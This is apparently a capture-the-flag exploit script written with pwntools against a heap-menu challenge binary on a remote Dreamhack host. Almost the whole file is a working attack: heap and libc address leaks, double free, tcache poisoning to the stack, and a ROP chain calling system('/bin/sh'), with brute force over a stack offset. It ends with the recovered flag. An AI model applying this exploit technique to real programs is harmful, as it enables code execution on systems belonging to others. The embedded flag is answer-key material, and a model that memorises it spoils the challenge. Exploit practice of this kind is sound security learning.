#!/usr/bin/env python3

from pwn import *

# at final rop, if you use pop rdi gadget, its wont work in remote, change to pop rdi rbp gadget
# idk why, thank you HaEHet for answer for this issue

exe = ELF('./prob_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def add(name, year, mont, day, hour):
	sla(b">> ", b"1")
	sa(b": ", name)
	sla(b": ", f"{year}".encode())
	sla(b": ", f"{mont}".encode())
	sla(b": ", f"{day}".encode())
	sla(b": ", f"{hour}".encode())

def dele(name):
	sla(b">> ", b"2")
	sa(b": ", name)

def edit(name, newname, year, mont, day, hour):
	sla(b">> ", b"3")
	sa(b": ", name)
	sa(b": ", newname)
	sla(b": ", f"{year}".encode())
	sla(b": ", f"{mont}".encode())
	sla(b": ", f"{day}".encode())
	sla(b": ", f"{hour}".encode())

def view():
	sla(b">> ", b"4")

def u2int(val):
	if(val > 2**31 - 1):
		val = (val - 0xffffffff) - 1
	return val

script = '''
brva 0x19B0
'''

ok = False
while(ok == False):
	for _x_ in range(-1, 2, 1):
		try:
			p = remote("host8.dreamhack.games", 21619)
			lleak("ATTEMPT: ", _x_)
			#p = remote("0", 1337)
			#p = process('./prob_patched')
			#p = gdb.debug('./prob_patched', gdbscript = script)

			# leak heap
			add(b"0" * 0x7, 0, 0, 0, 0)
			add(b"1" * 0x7, 1, 1, 1, 1)
			dele(b"1" * 0x7)
			view()
			rcu(b"1" * 7)
			rcu(b"Year : ")
			heap_base = int(p.recvline()) & 0xffffffff
			rcu(b"Month : ")
			heap_base = (((int(p.recvline()) & 0xffffffff) << 32) + heap_base) << 12
			lleak("heap_base", heap_base)

			# make fake unsortedbin
			for i in range(0x10):
				add(b"2" * 0x7, 2, 2, 2, 2)
			add(b"3" * 0x7, 3, 3, 3, 3)
			edit(b"0" * 7, b"0" * 7, 0, 0, 0x541, 0)

			# double free 
			dele(b"3" * 7)
			edit(b"3" * 7, b"3" * 7, 3, 3, 3, 3)
			dele(b"3" * 7)
			edit(b"3" * 7, b"3" * 7, 3, 3, 3, 3)
			dele(b"3" * 7)
			# tcache poisoning
			mangle = (heap_base + 0x2b0) ^ (heap_base + 0x7f0) >> 12
			add(b"3" * 7, u2int(mangle & 0xffffffff), u2int((mangle >> 32) & 0xffffffff), 3, 3)
			add(b"3" * 7, 3, 3, 3, 3)
			add(b"4" * 7, 4, 4, 4, 4)

			# leak libc
			dele(b"4" * 7)
			view()
			rcu(b"Name : ")
			libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x203b20
			lleak("libc_base", libc_base)

			# leak stack
			dele(b"3" * 7)
			edit(b"3" * 7, b"3" * 7, 3, 3, 3, 3)
			dele(b"3" * 7)
			edit(b"3" * 7, b"3" * 7, 3, 3, 3, 3)
			dele(b"3" * 7)
			mangle = (libc_base + libc.symbols['__environ'] - 0x18) ^ (heap_base + 0x7f0) >> 12
			add(b"3" * 7, u2int(mangle & 0xffffffff), u2int((mangle >> 32) & 0xffffffff), 3, 3)
			add(b"3" * 7, 3, 3, 3, 3)
			add(b"5" * 0x8, 5, 5, 5, 5)
			view()
			rcu(b"5" * 0x8)
			rsp_main = u64(p.recv(6).ljust(8, b"\x00")) - 0x148 # at local
			rsp_main += 0x10 * _x_ # bruteforces because local different with remote
			lleak("rsp_main", rsp_main)
			#debug()
			# tcache poisoning to stack
			dele(b"3" * 7)
			edit(b"3" * 7, b"3" * 7, 3, 3, 3, 3)
			dele(b"3" * 7)
			edit(b"3" * 7, b"3" * 7, 3, 3, 3, 3)
			dele(b"3" * 7)
			mangle = (rsp_main - 0x10) ^ (heap_base + 0x7f0) >> 12
			add(b"3" * 7, u2int(mangle & 0xffffffff), u2int((mangle >> 32) & 0xffffffff), 3, 3)
			add(b"3" * 7, 3, 3, 3, 3)

			# rop
			pop_rdi_rbp = libc_base + 0x000000000002a873
			system = libc_base + libc.symbols['system']
			binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
			payload = p64(binsh) + p64(0) + p64(system)
			add(payload, 0, 0, u2int(pop_rdi_rbp & 0xffffffff), u2int((pop_rdi_rbp >> 32) & 0xffffffff))

			# bruteforces things
			rcu(b"Add Success\n")
			sleep(0.5)
			sl(b"cat flag")
			s = p.recv(4)
			if(s == b"\nRes"):
				raise Exception

			lleak("offset diff", 0x10 * _x_)
			ok = True
			break
		except:
			try:
				p.close()
			except:
				pass

sl(b"ls")
sl(b"cat flag")

p.interactive()
#acsc{34c63c2ed1996c3209d965f987ad4bcfa4701aff}